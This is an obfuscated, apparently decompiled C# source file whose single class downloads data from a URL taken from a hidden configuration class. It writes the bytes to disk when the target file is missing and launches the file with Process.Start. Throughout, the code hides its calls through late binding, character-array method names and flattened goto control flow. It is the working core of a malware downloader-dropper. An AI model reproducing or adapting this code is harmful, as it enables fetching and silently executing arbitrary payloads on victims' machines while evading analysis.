using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using YntkCmRvu3wTEtF9OJ;

namespace upyrN9pMJ0keicIfdW;

[StandardModule]
internal sealed class J8vwYvJLi2ydaEg6Qr
{
	public static byte[] Vo3H0q7kyu(string string_0)
	{
		return (byte[])BZMfXmfdguuBfC67QiR(new WebClient(), null, new string(new char[12]
		{
			'D', 'o', 'w', 'n', 'l', 'o', 'a', 'd', 'D', 'a',
			't', 'a'
		}), new object[1] { string_0 }, null, null);
	}

	public static void uWmHe1REwZ()
	{
		VX7H0mfkpFgMD2nUdRL();
		if (J3PLyYfxkJCbBDufJ3O())
		{
			goto IL_0093;
		}
		goto IL_00c0;
		IL_00c0:
		string string_ = default(string);
		while (true)
		{
			IL_00c0_2:
			H7JxfwfsC08MM47AkIx(nYpEWkfiZyV5M4NTYyy(EkWM3SuPulRFvZGJal.W4FZoU0kFq), Vo3H0q7kyu(string_));
			while (true)
			{
				Type type_ = A7VcJKfLwK6M0sOnLwi(typeof(Process).TypeHandle);
				object[] array = new object[1] { RuntimeHelpers.GetObjectValue(EkWM3SuPulRFvZGJal.W4FZoU0kFq) };
				bool[] array2 = new bool[1] { true };
				Uh6lJDfqldU18oOYcDG(null, type_, "Start", array, null, null, array2, bool_0: true);
				if (VX7H0mfkpFgMD2nUdRL())
				{
					return;
				}
				switch (5)
				{
				case 0:
				case 2:
					goto end_IL_0018;
				case 8:
					goto IL_009a;
				case 1:
					goto IL_009e;
				case 9:
					goto IL_00a9;
				case 4:
				case 7:
					goto IL_00c0_2;
				case 5:
					if (array2[0])
					{
						EkWM3SuPulRFvZGJal.W4FZoU0kFq = RuntimeHelpers.GetObjectValue(array[0]);
					}
					goto IL_00ef;
				case 6:
					goto IL_00ef;
				case 10:
					return;
				}
				continue;
				end_IL_0018:
				break;
			}
			break;
		}
		goto IL_0093;
		IL_009a:
		bool flag = default(bool);
		if (!flag)
		{
			return;
		}
		goto IL_009e;
		IL_009e:
		string_ = (string)nYpEWkfiZyV5M4NTYyy(EkWM3SuPulRFvZGJal.k9TZYrVcSF);
		goto IL_00a9;
		IL_00ef:
		Thread.Sleep(2000);
		return;
		IL_00a9:
		if (flag = !File.Exists((string?)nYpEWkfiZyV5M4NTYyy(EkWM3SuPulRFvZGJal.W4FZoU0kFq)))
		{
			goto IL_00c0;
		}
		goto IL_00ef;
		IL_0093:
		flag = EkWM3SuPulRFvZGJal.dO75NwdC88;
		goto IL_009a;
	}

	internal static object BZMfXmfdguuBfC67QiR(object object_0, Type type_0, object object_1, object object_2, object object_3, object object_4)
	{
		return LateBinding.LateGet(object_0, type_0, (string)object_1, (object[])object_2, (string[])object_3, (bool[])object_4);
	}

	internal static bool J3PLyYfxkJCbBDufJ3O()
	{
		return true;
	}

	internal static bool VX7H0mfkpFgMD2nUdRL()
	{
		return false;
	}

	internal static object nYpEWkfiZyV5M4NTYyy(object object_0)
	{
		return Conversions.ToString(object_0);
	}

	internal static void H7JxfwfsC08MM47AkIx(object object_0, object object_1)
	{
		File.WriteAllBytes((string)object_0, (byte[])object_1);
	}

	internal static Type A7VcJKfLwK6M0sOnLwi(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	internal static object Uh6lJDfqldU18oOYcDG(object object_0, Type type_0, object object_1, object object_2, object object_3, object object_4, object object_5, bool bool_0)
	{
		return NewLateBinding.LateCall(object_0, type_0, (string)object_1, (object[])object_2, (string[])object_3, (Type[])object_4, (bool[])object_5, bool_0);
	}
}
